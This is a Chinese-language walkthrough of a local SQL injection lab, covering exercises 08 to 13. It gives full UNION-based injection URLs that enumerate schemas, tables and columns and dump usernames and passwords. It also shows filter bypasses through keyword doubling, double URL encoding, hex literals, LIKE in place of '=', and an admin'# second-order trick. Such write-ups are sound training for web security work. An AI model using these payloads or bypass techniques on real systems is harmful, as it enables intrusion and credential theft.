爆库  
`http://localhost:32774/sqli/08.php?id=1 union Select
1,2,group_concat(schema_name) from information_schema.schemata--+`
爆表  
`http://localhost:32774/sqli/08.php?id=1 union Select 1,2,(Select
group_concat(table_name) from information_schema.tables where
table_schema=database())--+`
爆列  
`http://localhost:32774/sqli/08.php?id=1 union Select 1,2,(Select
group_concat(column_name) from information_schema.columns where table_schema
=database() and table_name='users')--+`
爆数据  
`http://localhost:32774/sqli/08.php?id=1 union Select 1,2,(Select
group_concat(concat(role,0x7e,username,0x3A,password,0x7e)) from users)--+`
###  09-双写关键字绕过
确认存在注入  
发现过滤了select字符串，题目可得需要用双写来绕过，试一下  
`http://localhost:32774/sqli/09.php?id=1 union seselectlect 1,2,3--+`  
绕过的原因
> 因为在匹配到”se”+”select”+”lect”中的select后替换为空后前后拼接起来就是select成功的绕过唯一一次检验
爆库  
`http://localhost:32774/sqli/09.php?id=1 union seselectlect
1,2,group_concat(schema_name) from information_schema.schemata--+`
爆表  
`http://localhost:32774/sqli/09.php?id=1 union seselectlect 1,2,(seselectlect
group_concat(table_name) from information_schema.tables where
table_schema=database())--+`
爆列  
`http://localhost:32774/sqli/09.php?id=1 union seselectlect 1,2,(seselectlect
group_concat(column_name) from information_schema.columns where table_schema
=database() and table_name='users')--+`
爆数据  
`http://localhost:32774/sqli/09.php?id=1 union seselectlect 1,2,(seselectlect
group_concat(concat(role,0x7e,username,0x3A,password,0x7e)) from users)--+`
###  10-双重url编码绕过
根据题目可以猜到源码对$id进行了一次urldecode，在测试的过程中还能发现对select进行了waf，所以只需要根据第八题的payload进行两次urlencode即可  
脚本
    a = ""
    print urllib.quote(urllib.quote(a))
本以为是这样的  
结果完全没派上用场，第八题的语句完全照搬都能跑得通
但出于对题目的尊重还是用双重url编码绕过一下吧
爆库
> 原句  
> `1 union Select 1,2,group_concat(schema_name) from
> information_schema.schemata#`  
>  编码后  
>
> `1%2520union%2520Select%25201%252C2%252Cgroup_concat%2528schema_name%2529%2520from%2520information_schema.schemata%2523`  
>  最终  
>
> `http://localhost:32774/sqli/10.php?id=1%2520union%2520Select%25201%252C2%252Cgroup_concat%2528schema_name%2529%2520from%2520information_schema.schemata%2523`
爆表
> 原句  
> `1 union Select 1,2,(Select group_concat(table_name) from
> information_schema.tables where table_schema=database())#`  
>  编码后  
>
> `1%2520union%2520Select%25201%252C2%252C%2528Select%2520group_concat%2528table_name%2529%2520from%2520information_schema.tables%2520where%2520table_schema%253Ddatabase%2528%2529%2529%2523`  
>  最终  
>
> `http://localhost:32774/sqli/10.php?id=1%2520union%2520Select%25201%252C2%252C%2528Select%2520group_concat%2528table_name%2529%2520from%2520information_schema.tables%2520where%2520table_schema%253Ddatabase%2528%2529%2529%2523`  
>
爆列
> 原句  
> `1 union Select 1,2,(Select group_concat(column_name) from
> information_schema.columns where table_schema =database() and
> table_name='users')#`  
>  编码后  
>
> `1%2520union%2520Select%25201%252C2%252C%2528Select%2520group_concat%2528column_name%2529%2520from%2520information_schema.columns%2520where%2520table_schema%2520%253Ddatabase%2528%2529%2520and%2520table_name%253D%2527users%2527%2529%2523`  
>  最终  
>
> `http://localhost:32774/sqli/10.php?id=1%2520union%2520Select%25201%252C2%252C%2528Select%2520group_concat%2528column_name%2529%2520from%2520information_schema.columns%2520where%2520table_schema%2520%253Ddatabase%2528%2529%2520and%2520table_name%253D%2527users%2527%2529%2523`  
>
爆数据
> 原句  
> `1 union Select 1,2,(Select
> group_concat(concat(role,0x7e,username,0x3A,password,0x7e)) from users) #`  
>  编码后  
>
> `1%2520union%2520Select%25201%252C2%252C%2528Select%2520group_concat%2528concat%2528role%252C0x7e%252Cusername%252C0x3A%252Cpassword%252C0x7e%2529%2529%2520from%2520users%2529%2520%2523`  
>  最终  
>
> `http://localhost:32774/sqli/10.php?id=1%2520union%2520Select%25201%252C2%252C%2528Select%2520group_concat%2528concat%2528role%252C0x7e%252Cusername%252C0x3A%252Cpassword%252C0x7e%2529%2529%2520from%2520users%2529%2520%2523`  
>
###  11-十六进制绕过
先按正常步骤去做  
查显示位  
`http://localhost:32774/sqli/11.php?id=1%20union%20select%201,2,3--+`  
爆库  
`localhost:32774/sqli/11.php?id=1 union select 1,2,group_concat(schema_name)
from information_schema.schemata--+`  
爆表  
`localhost:32774/sqli/11.php?id=1 union select 1,2,(select
group_concat(table_name) from information_schema.tables where
table_schema=database())--+`  
查列的时候问题就来了，发现引号被过滤了
这里就考虑到使用user的十六进制绕过限制
爆列  
`http://localhost:32774/sqli/11.php?id=1 union select 1,2,(select
group_concat(column_name) from information_schema.columns where table_schema
=database() and table_name=0x75736572)--+`
爆数据  
`http://localhost:32774/sqli/11.php?id=1 union select 1,2,(select
group_concat(concat(id,0x7e,username,0x3A,password,0x7e)) from user) --+`
###  12-等价函数替换过滤绕过
简单尝试后可知对等号进行了waf，那么爆库的语句还是正常的  
`http://localhost:32774/sqli/12.php?id=1 union select
1,2,group_concat(schema_name) from information_schema.schemata--+`  
这里就根据题目，使用与等号等价的函数进行替换，这里我选择用like，因为如果没有使用百分号,like子句与等号的效果是一样的  
爆表  
`http://localhost:32774/sqli/12.php?id=1 union select 1,2,(select
group_concat(table_name) from information_schema.tables where table_schema
like database())--+`  
爆列  
`http://localhost:32774/sqli/12.php?id=1 union select 1,2,(select
group_concat(column_name) from information_schema.columns where table_schema
like database() and table_name like 'users')--+`
爆数据  
`http://localhost:32774/sqli/12.php?id=1 union select 1,2,(select
group_concat(concat(role,0x7e,username,0x3A,password,0x7e)) from users) --+`
###  13-二次注入
这题其实挺简单的，简单的整理下流程  
1.注册用户，输入username，password，email  
2.找回密码，输入存在的邮箱即可返回用户名和密码  
那么问题来了，这是一道注入题，从注入的角度来说应该是在username放入查询语句再通过找回密码来执行  
但由于我很懒，我选择直接用万能密码法
这样就会使查询语句查的是admin而不是`admin'#`